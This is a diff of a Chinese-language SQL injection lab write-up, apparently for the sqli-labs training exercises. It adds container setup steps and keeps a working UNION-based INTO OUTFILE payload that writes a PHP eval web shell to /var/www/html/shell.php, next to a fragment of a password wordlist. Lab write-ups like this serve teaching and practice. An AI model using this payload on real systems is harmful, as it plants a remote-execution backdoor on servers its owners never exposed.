@@ -320,18 +320,24 @@ Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,adm
 
 2. 利用outfile将查询结果写入文件,同时可以写shell (此处需要对mysql进行配置)
 
+`docker exec -it xxx bash`进入容器
+
+`mysql -e "show global variables like 'secure_file_priv';"`检查`secure-file-priv`当前的值是否为空(不是`NULL`)
+
 ```
-->todo
+root@2fef8c08e970:/# mysql -e "show global variables like 'secure_file_priv';"
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+```
+
+同时在`/var/www/html`添加可写权限
+
 传入`?id=1')) union select 1,2,'<?php eval($_POST[_]);?>' into outfile "/var/www/html/shell.php" --%20`
 
-![image-20210506211517120](image-20210506211517120.png)
-
-或者传入`?id=1')) UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata into outfile "/var/www/html/wdnmd" -- `
-
-![image-20210506212215539](image-20210506212215539.png)
-
-后面的步骤与Less-1相同
-```
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111071449768.png)
 
 ### Less-8
 
